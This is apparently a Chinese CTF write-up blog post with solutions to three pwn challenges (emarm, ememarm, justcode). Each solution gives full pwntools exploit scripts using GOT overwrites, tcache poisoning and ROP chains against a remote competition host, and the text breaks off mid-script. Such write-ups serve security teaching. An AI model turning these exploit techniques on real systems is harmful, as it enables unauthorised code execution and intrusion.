        <content type="html"><![CDATA[<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="emarm"><a href="#emarm" class="headerlink" title="emarm"></a>emarm</h3><h4 id="基本情况"><a href="#基本情况" class="headerlink" title="基本情况"></a>基本情况</h4><p>Aarch64 题目没有打开 pie 。程序存在一个任意地址写入：</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210203163021.png" alt="image-20210203163013826"></p><p>随机数验证输入 <code>\x00</code> 绕过。</p><p>远程是用 qemu 部署，地址不随机。第一次泄露地址，第二次 getshell 。</p><p>利用任意地址写，将 atoi got 改为 printf ，在 main 函数控制 atoi 参数实现格式化字符串泄露出栈上 got 表信息。</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210203163610.png" alt="image-20210203163610628"></p><p>第二次就讲 atoi 修改为 system 参数为 /bin/sh\x00</p><h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.binary = <span class="string">&quot;emarm&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">&quot;r&quot;</span>:</span><br><span class="line">    p = remote(<span class="string">&quot;183.129.189.60&quot;</span>, <span class="number">10012</span>)</span><br><span class="line"><span class="keyword">elif</span> sys.argv[<span class="number">1</span>] == <span class="string">&quot;l&quot;</span>:</span><br><span class="line">    p = process([<span class="string">&quot;qemu-aarch64&quot;</span>, <span class="string">&quot;-L&quot;</span>, <span class="string">&quot;.&quot;</span>, <span class="string">&quot;./emarm&quot;</span>])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process([<span class="string">&quot;qemu-aarch64&quot;</span>, <span class="string">&quot;-g&quot;</span>, <span class="string">&quot;1234&quot;</span>, <span class="string">&quot;-L&quot;</span>, <span class="string">&quot;.&quot;</span>, <span class="string">&quot;./emarm&quot;</span>])</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;emarm&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./lib/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;passwd:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">p.send(<span class="built_in">str</span>(elf.got[<span class="string">&#x27;atoi&#x27;</span>]))</span><br><span class="line">p.recvuntil(<span class="string">&quot;you will success&quot;</span>)</span><br><span class="line">p.send(p64(elf.plt[<span class="string">&#x27;printf&#x27;</span>]))</span><br><span class="line">p.recvuntil(<span class="string">&quot;i leave for you bye&quot;</span>)</span><br><span class="line">p.send(<span class="string">&quot;%9$p&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line"></span><br><span class="line">leak_addr = <span class="built_in">int</span>(p.recv(<span class="number">10</span>),<span class="number">16</span>)</span><br><span class="line">log.info(<span class="string">&quot;leak_addr:&quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">libc_base = leak_addr-<span class="number">0x206e0</span></span><br><span class="line">log.info(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">&quot;r&quot;</span>:</span><br><span class="line">    p = remote(<span class="string">&quot;183.129.189.60&quot;</span>, <span class="number">10012</span>)</span><br><span class="line"><span class="keyword">elif</span> sys.argv[<span class="number">1</span>] == <span class="string">&quot;l&quot;</span>:</span><br><span class="line">    p = process([<span class="string">&quot;qemu-aarch64&quot;</span>, <span class="string">&quot;-L&quot;</span>, <span class="string">&quot;.&quot;</span>, <span class="string">&quot;./emarm&quot;</span>])</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;passwd:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">p.send(<span class="built_in">str</span>(elf.got[<span class="string">&#x27;atoi&#x27;</span>]))</span><br><span class="line">p.recvuntil(<span class="string">&quot;you will success&quot;</span>)</span><br><span class="line">p.send(p64(libc.symbols[<span class="string">&#x27;system&#x27;</span>]+libc_base))</span><br><span class="line">p.recvuntil(<span class="string">&quot;i leave for you bye&quot;</span>)</span><br><span class="line">p.send(<span class="string">&quot;sh\x00&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><blockquote><p>flag{33c34e317026a39feeea14fdd97fa846}</p></blockquote><h3 id="ememarm"><a href="#ememarm" class="headerlink" title="ememarm"></a>ememarm</h3><h4 id="基本情况-1"><a href="#基本情况-1" class="headerlink" title="基本情况"></a>基本情况</h4><p>Aarch64 堆题目，libc 是 2.27 ，输出功能是个摆设。能可以 malloc 0x20 ＆ 0x30 。</p><p>程序一开始 malloc 0x20 那个堆块相当于是个链头， 0x20 和 0x30 堆内结构体如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">  x;<span class="comment">//8bit</span></span><br><span class="line">  y;<span class="comment">//8bit</span></span><br><span class="line">  null;<span class="comment">//8bit</span></span><br><span class="line">  next_ptr;<span class="comment">//8bit</span></span><br><span class="line">  ……</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个 next_ptr 是下一个堆块的地址，通过这个属性构成一个链表。malloc 堆块是否加入链表是看申请完那个 <code>do you want delete</code> 选择。</p><p>edit 的时候溢出一个 <code>\x00</code> ：</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210203220521.png" alt="image-20210203220521033"></p><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>利用溢出，释放一个 fake_chunk 。将两个 0x30 堆分别布置到 0x4132e0 和 0x413320 ，都加入链表。前一个堆被溢出后执行自身的 fd_nextsize 位置，同时这个位置被视为 0x20 堆块放入 tcachebin 。利用 edit 修改 tcachebin fd 实现 house of sprit</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210203220806.png" alt="image-20210203220806048"></p><p>由于题目给的 libc 文件没有 debug 信息，所以 gdb 的 heap 和 bin 指令是不能用的。heap 指令用直接查地址代替，地址可以在 vmmap 看。tcache bin 可以查 heap 分段开始 0x250 的结构体。</p><h4 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.binary = <span class="string">&quot;ememarm&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">&quot;r&quot;</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;183.129.189.60&#x27;</span>, <span class="number">10034</span>)</span><br><span class="line"><span class="keyword">elif</span> sys.argv[<span class="number">1</span>] == <span class="string">&quot;l&quot;</span>:</span><br><span class="line">    p = process([<span class="string">&quot;qemu-aarch64&quot;</span>, <span class="string">&quot;-L&quot;</span>, <span class="string">&quot;.&quot;</span>, <span class="string">&quot;ememarm&quot;</span>])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process([<span class="string">&quot;qemu-aarch64&quot;</span>, <span class="string">&quot;-g&quot;</span>, <span class="string">&quot;1234&quot;</span>, <span class="string">&quot;-L&quot;</span>, <span class="string">&quot;.&quot;</span>, <span class="string">&quot;ememarm&quot;</span>])</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;ememarm&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./lib/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_1</span>(<span class="params">x, y, add</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice:&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;cx:&#x27;</span>, x)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;cy:&#x27;</span>, y)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;delete?&#x27;</span>, <span class="built_in">str</span>(add))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_2</span>(<span class="params">x, y, add</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice:&#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;cx:&#x27;</span>, x)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;cy:&#x27;</span>, y)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;delete?&#x27;</span>, <span class="built_in">str</span>(add))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">pos, content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice: \n&#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(pos))</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;~~&quot;</span>)</span><br><span class="line">bss_addr = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop=<span class="number">1</span>))</span><br><span class="line">log.info(<span class="string">&quot;bss_addr:&quot;</span>+<span class="built_in">hex</span>(bss_addr))</span><br><span class="line">p.sendline(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># prt=0x413250</span></span><br><span class="line">add_1(<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="number">0</span>)</span><br><span class="line">add_1(<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="number">0</span>)</span><br><span class="line">add_2(<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="number">1</span>)</span><br><span class="line">add_2(<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">1</span>, flat(<span class="number">0</span>, <span class="number">0x31</span>, <span class="number">0</span>))<span class="comment">#free fake_chunk</span></span><br><span class="line">edit(<span class="number">1</span>, flat(<span class="number">0</span>, <span class="number">0x31</span>, elf.got[<span class="string">&#x27;free&#x27;</span>]-<span class="number">8</span>))<span class="comment"># overwrite tcache fd</span></span><br><span class="line"></span><br><span class="line">add_1(<span class="string">&#x27;\x00&#x27;</span>, <span class="string">&#x27;\x00&#x27;</span>, <span class="number">0</span>)</span><br><span class="line"><span class="comment"># allocate chunk in got </span></span><br><span class="line">add_1(p8(<span class="number">0x40</span>), p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>]), <span class="number">1</span>)</span><br><span class="line">edit(<span class="number">1</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_addr=u64(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>)[-<span class="number">3</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))+<span class="number">0x4000000000</span></span><br><span class="line">log.info(<span class="string">&quot;puts_addr:&quot;</span>+<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">libc_base=puts_addr-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&#x27;libc_base:&#x27;</span>+<span class="built_in">hex</span>(libc_base)) <span class="comment"># 0x400086f2c8</span></span><br><span class="line"></span><br><span class="line">p.close()</span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">&quot;r&quot;</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;183.129.189.60&#x27;</span>, <span class="number">10034</span>)</span><br><span class="line"><span class="keyword">elif</span> sys.argv[<span class="number">1</span>] == <span class="string">&quot;l&quot;</span>:</span><br><span class="line">    p = process([<span class="string">&quot;qemu-aarch64&quot;</span>, <span class="string">&quot;-L&quot;</span>, <span class="string">&quot;.&quot;</span>, <span class="string">&quot;ememarm&quot;</span>])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process([<span class="string">&quot;qemu-aarch64&quot;</span>, <span class="string">&quot;-g&quot;</span>, <span class="string">&quot;1234&quot;</span>, <span class="string">&quot;-L&quot;</span>, <span class="string">&quot;.&quot;</span>, <span class="string">&quot;ememarm&quot;</span>])</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;~~&quot;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">add_1(<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="number">0</span>)</span><br><span class="line">add_1(<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="number">0</span>)</span><br><span class="line">add_2(<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="number">1</span>)</span><br><span class="line">add_2(<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">1</span>, flat(<span class="number">0</span>, <span class="number">0x31</span>, <span class="number">0</span>))<span class="comment">#free fake_chunk</span></span><br><span class="line">edit(<span class="number">1</span>, flat(<span class="number">0</span>, <span class="number">0x31</span>, libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]))<span class="comment"># overwrite tcache fd</span></span><br><span class="line"></span><br><span class="line">add_1(<span class="string">&#x27;/bin/sh\x00&#x27;</span>, <span class="string">&#x27;\x00&#x27;</span>, <span class="number">1</span>)</span><br><span class="line"><span class="comment"># allocate chunk in got </span></span><br><span class="line">add_1(p64(libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]),<span class="string">&#x27;\x00&#x27;</span>, <span class="number">1</span>)</span><br><span class="line">edit(<span class="number">1</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><blockquote><p>flag{1f16c67b554e9e75300f37e9f08d0aa4}</p></blockquote><h3 id="justcode"><a href="#justcode" class="headerlink" title="justcode"></a>justcode</h3><h4 id="基本情况-2"><a href="#基本情况-2" class="headerlink" title="基本情况"></a>基本情况</h4><p>Amd64 开启沙盒禁用 execve </p><p>直接审代码就 name 写入时能够溢出修改 canary ：</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210204152423.png" alt="image-20210204152423664"></p><p>因为没有置零栈区再使用，在写入 name 时可以泄露出站上的 libc 地址：</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210204153423.png" alt="image-20210204153422944"></p><p>另外一个问题得细心调试才观察出来，也是因为栈上的数据没有经过置零后再使用，导致在输入 name 时，可以控制  sub_400CCA() 的写入地址 v1 ，实现<strong>任意地址写</strong>。</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210204153028.png" alt="image-20210204153028209"></p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210204153736.png" alt="image-20210204153736391"></p><h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><p><code>sub_400C47()</code> 泄露出 libc 地址；<code>sub_400C47()</code> 写入目标地址，<code>sub_400CCA()</code> 向目标地址写入值，修改 exit 为 main 突破操作 4 次的限制；</p><p>将 rop 利用链通过 name 写入栈上，将 strdup 劫持为 gadget <code>add rsp 8;ret</code> ，将程序流 hijack 到栈上。也可以控制寄存器用 <code>sub_400CCA()</code> scanf 往 bss 写入利用链，控制 rbp、rip 栈迁移。</p><h4 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.binary=<span class="string">&quot;justcode&quot;</span></span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&quot;./justcode&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;183.129.189.60&quot;</span>,<span class="number">10041</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./justcode&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;:\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line"><span class="comment">#1 leak libc</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">8</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;:\n&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(payload)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x7b60a</span></span><br><span class="line">log.info(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="comment">#1 write v1 addr</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;:\n&quot;</span>)</span><br><span class="line">p.send(<span class="string">&#x27;a&#x27;</span>*<span class="number">12</span>+p64(elf.got[<span class="string">&#x27;exit&#x27;</span>]))</span><br><span class="line"><span class="comment">#2 overwrite exit</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;id:\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0x400D4B</span>))</span><br><span class="line">p.sendline(<span class="string">&quot;b&quot;</span>)</span><br><span class="line"></span><br><span class="line">bss_addr=elf.bss()</span><br><span class="line">main_addr=<span class="number">0x400D76</span></span><br><span class="line">rop_addr=<span class="number">0x6020e0</span></span><br><span class="line">pop_rdi_ret=<span class="number">0x21112</span>+libc_base</span><br><span class="line">pop_rsi_ret=<span class="number">0x202f8</span>+libc_base</span><br><span class="line">pop_rdx_ret=<span class="number">0x1b92</span>+libc_base</span><br><span class="line">add_rsp8_ret=<span class="number">0x35142</span>+libc_base</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;code:\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#1 leak stack addr</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x27</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;:\n&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(payload+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">main_ret_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.info(<span class="string">&quot;main_ret_addr:&quot;</span>+<span class="built_in">hex</span>(main_ret_addr))</span><br><span class="line">flag_addr=main_ret_addr-<span class="number">0x80</span>-<span class="number">0x28</span><span class="comment">#0x9e</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># open(&amp;flag,0,0)</span></span><br><span class="line">rop=p64(pop_rdi_ret)+p64(flag_addr)+p64(pop_rsi_ret)+p64(<span class="number">0</span>)+p64(pop_rdx_ret)+p64(<span class="number">0</span>)+p64(libc_base+libc.sym[<span class="string">&#x27;open&#x27;</span>])</span><br><span class="line"><span class="comment"># read(3,bss_addr,0x40)</span></span><br><span class="line">rop+=p64(pop_rdi_ret)+p64(<span class="number">3</span>)+p64(pop_rsi_ret)+p64(bss_addr)+p64(pop_rdx_ret)+p64(<span class="number">0x40</span>)+p64(elf.plt[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line"><span class="comment"># puts(bss_addr)</span></span><br><span class="line">rop+=p64(pop_rdi_ret)+p64(bss_addr)+p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])+<span class="string">&#x27;./flag\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;code:\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#1 write v1 addr</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;:\n&quot;</span>)</span><br><span class="line">p.send(<span class="string">&#x27;a&#x27;</span>*<span class="number">12</span>+p64(elf.got[<span class="string">&#x27;strdup&#x27;</span>]))</span><br><span class="line"><span class="comment">#2 overwrite strdup</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;id:\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(add_rsp8_ret&amp;<span class="number">0xffffffff</span>))</span><br><span class="line">p.sendline(<span class="string">&quot;a&quot;</span>)</span><br><span class="line"><span class="comment">#1 write rop &amp; getshell</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;name:\n&quot;</span>)</span><br><span class="line">p.send(rop)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#sh = process(&quot;./justcode&quot;)</span></span><br><span class="line">sh = remote(<span class="string">&quot;183.129.189.60&quot;</span>,<span class="number">10041</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;justcode&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;libc.so&quot;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&quot;code:&quot;</span>)</span><br><span class="line">main = <span class="number">0x400D4B</span></span><br><span class="line">sh.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">sh.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">sh.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">sh.sendline(<span 